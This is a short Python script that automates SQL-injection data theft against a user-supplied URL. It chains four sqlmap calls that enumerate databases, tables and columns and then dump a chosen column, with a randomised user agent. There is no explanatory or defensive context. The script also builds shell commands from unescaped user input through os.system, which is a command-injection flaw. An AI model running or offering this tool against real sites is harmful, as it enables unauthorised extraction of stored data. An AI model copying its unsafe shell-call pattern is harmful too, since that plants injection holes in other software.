import os
url = input("Enter The Target URL : ")
sqlmap1 = os.system("sqlmap --url {} --dbs --random-agent".format(url))
dbs = input("enter database name : ")
sqlmap2 = os.system("sqlmap --url {} -D {} --tables --random-agent".format(url,dbs))
tab1 = input("Enter table name : ")
sqlamp3 = os.system("sqlmap --url {} -D {} -T {} --columns --random-agent".format(url,dbs,tab1))
colm = input("input column : ")
sqlmap4 = os.system("sqlmap --url {} -D {} -T {} -C {} --dump --random-agent".format(url,dbs,tab1,colm))

